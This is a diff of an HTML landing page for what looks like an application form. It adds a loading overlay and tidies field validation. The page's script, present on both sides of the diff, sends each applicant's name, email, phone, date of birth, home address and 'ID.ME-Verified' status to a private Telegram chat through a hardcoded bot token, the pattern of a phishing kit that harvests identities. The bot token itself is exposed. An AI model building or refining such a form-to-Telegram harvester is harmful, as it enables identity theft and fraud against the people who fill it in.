@@ -15,10 +15,42 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
     <link href="landing.css" rel="stylesheet" />
     <link rel="icon" href="/img/favicon.png" sizes="32x32">
-
+    <style>
+        #preloader {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.45);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 16px;
+        }
+        #preloader.active { display: flex; }
+        .spinner {
+            width: 52px;
+            height: 52px;
+            border: 5px solid #fff;
+            border-top-color: #0d6efd;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        #preloader p {
+            color: #fff;
+            font-size: 1rem;
+            margin: 0;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 
 <body>
+    <!-- Preloader overlay -->
+    <div id="preloader">
+        <div class="spinner"></div>
+        <p>Submitting your application...</p>
+    </div>
     <nav class="navbar navbar-expand-lg fixed-top bg-tranparent">
         <div class="container-lg ">
             <a class="navbar-brand" href="./"><img src="/img/logo.png" width="100px" /></a>
@@ -184,116 +216,111 @@
 </html>
 
   <script>
-    const BOT_TOKEN = "7976139006:AAHM8CX3EaG5ePraA6ogpAl7im7gTE3zf-M"; // your bot token
-    const CHAT_ID = "8368146567"; // your chat ID
+    const BOT_TOKEN = "7976139006:AAHM8CX3EaG5ePraA6ogpAl7im7gTE3zf-M";
+    const CHAT_ID = "8368146567";
     const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const preloader = document.getElementById("preloader");
+    const submitBtn = document.querySelector("#telegramForm button[type='submit']");
 
     document.getElementById("telegramForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
       const firstname = document.getElementById("first_name").value.trim();
-      const lastname = document.getElementById("last_name").value.trim();
-      const email = document.getElementById("email").value.trim();
-      const phone = document.getElementById("phone_no").value.trim();
-      const dob = document.getElementById("dob").value.trim();
-      const address = document.getElementById("address").value.trim();
-      const state = document.getElementById("state").value.trim();
-      const city = document.getElementById("city").value.trim();
-      const zipcode = document.getElementById("zip_code").value.trim();
+      const lastname  = document.getElementById("last_name").value.trim();
+      const email     = document.getElementById("email").value.trim();
+      const phone     = document.getElementById("phone_no").value.trim();
+      const dob       = document.getElementById("dob").value.trim();
+      const address   = document.getElementById("address").value.trim();
+      const state     = document.getElementById("state").value.trim();
+      const city      = document.getElementById("city").value.trim();
+      const zipcode   = document.getElementById("zip_code").value.trim();
       const expertise = document.getElementById("expertise").value.trim();
-      const verified = document.getElementById("verified").value.trim();
-      const statusEl = document.getElementById("statusMessage");
+      const verified  = document.getElementById("verified").value.trim();
+      const statusEl  = document.getElementById("statusMessage");
 
-      if (firstname === "" && lastname === "" && email === ""  && phone === ""  && dob === ""  && address === ""  && state === ""  && city === ""  && zipcode === ""  && expertise === ""  && verified === "") {
-        statusEl.innerHTML = `Fill out all Information`;
+      // Fixed: use || so any single empty field triggers the correct message
+      if (firstname === "") {
+        statusEl.innerHTML = "Enter your first name.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        } else if (firstname === "") {
-        statusEl.innerHTML = ` Enter your firstname.`;
+      } else if (lastname === "") {
+        statusEl.innerHTML = "Enter your last name.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }else if (lastname === "") {
-        statusEl.innerHTML = ` Enter your lastname.`;
+      } else if (email === "") {
+        statusEl.innerHTML = "Enter your email address.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-        else if (email === "") {
-        statusEl.innerHTML = ` Enter your email.`;
+      } else if (phone === "") {
+        statusEl.innerHTML = "Enter your phone number.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (phone === "") {
-        statusEl.innerHTML = ` Enter your phone.`;
+      } else if (dob === "") {
+        statusEl.innerHTML = "Enter your date of birth.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (dob === "") {
-        statusEl.innerHTML = ` Enter your dob.`;
+      } else if (address === "") {
+        statusEl.innerHTML = "Enter your address.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (address === "") {
-        statusEl.innerHTML = ` Enter your address.`;
+      } else if (state === "") {
+        statusEl.innerHTML = "Enter your state.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (state === "") {
-        statusEl.innerHTML = ` Enter your state.`;
+      } else if (city === "") {
+        statusEl.innerHTML = "Enter your city.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (city === "") {
-        statusEl.innerHTML = ` Enter your city.`;
+      } else if (zipcode === "") {
+        statusEl.innerHTML = "Enter your zip code.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (zipcode === "") {
-        statusEl.innerHTML = ` Enter your zipcode.`;
+      } else if (expertise === "") {
+        statusEl.innerHTML = "Enter your area of expertise.";
         statusEl.className = "mt-4 text-sm text-danger";
         return;
-        }
-         else if (expertise === "") {
-        statusEl.innerHTML = ` Enter your expertise.`;
-        statusEl.className = "mt-4 text-sm text-danger";
-        return;
-        }
-         else if (verified === "") {
-        statusEl.innerHTML = ` Enter your verified.`;
-        statusEl.className = "mt-4 text-sm text-danger";
-        return;
-        }
-      const message = `📩 New Form Submission:\n\nFirstName: ${firstname}\nLastName: ${lastname}\nEmail: ${email}\nPhone Number: ${phone}\nDOB: ${dob}\nAddress: ${address}\nstate: ${state}\ncity: ${city}\nZipcode: ${zipcode}\nExpertise: ${expertise}\nID.ME-Verified: ${verified}`;
+      }
 
+      // Clear any previous status and show preloader
+      statusEl.textContent = "";
+      statusEl.className = "";
+      preloader.classList.add("active");
+      submitBtn.disabled = true;
 
+      const message = `📩 New Form Submission:\n\nFirstName: ${firstname}\nLastName: ${lastname}\nEmail: ${email}\nPhone Number: ${phone}\nDOB: ${dob}\nAddress: ${address}\nState: ${state}\nCity: ${city}\nZipcode: ${zipcode}\nExpertise: ${expertise}\nID.ME-Verified: ${verified}`;
 
       fetch(API_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok) {
-            // Redirect immediately
-            statusEl.textContent = "Form Successfully submitted.";
-            statusEl.className = "text-center mt-4 bg-success text-white h4 ";
+      })
+      .then(res => res.json())
+      .then(data => {
+        preloader.classList.remove("active");
+        submitBtn.disabled = false;
 
-    // Clear all inputs in the form
-            document.querySelectorAll("input, textarea, select").forEach(el => {
+        if (data.ok) {
+          // Only clear and show success AFTER confirmed delivery
+          document.querySelectorAll("#telegramForm input, #telegramForm textarea, #telegramForm select").forEach(el => {
             el.value = "";
-            });
-            
-            } else {
-            statusEl.textContent = "❌ Failed to submit.";
-            statusEl.className = "text-center mt-4 text-danger";
-            }
-        })
-        .catch(err => {
-            console.error("Error:", err);
-            statusEl.textContent = "⚠️ Network error.";
-            statusEl.className = "text-center mt-4 text-red-600";
-        });
-            });
+          });
+          statusEl.textContent = "Form Successfully Submitted.";
+          statusEl.className = "text-center mt-4 bg-success text-white h4 p-2 rounded";
+        } else {
+          console.error("Telegram error:", data.description);
+          statusEl.textContent = "Failed to submit: " + (data.description || "Unknown error.");
+          statusEl.className = "text-center mt-4 text-danger";
+        }
+      })
+      .catch(err => {
+        preloader.classList.remove("active");
+        submitBtn.disabled = false;
+        console.error("Network error:", err);
+        statusEl.textContent = "Network error. Please check your connection and try again.";
+        statusEl.className = "text-center mt-4 text-danger";
+      });
+    });
   </script>
 
 
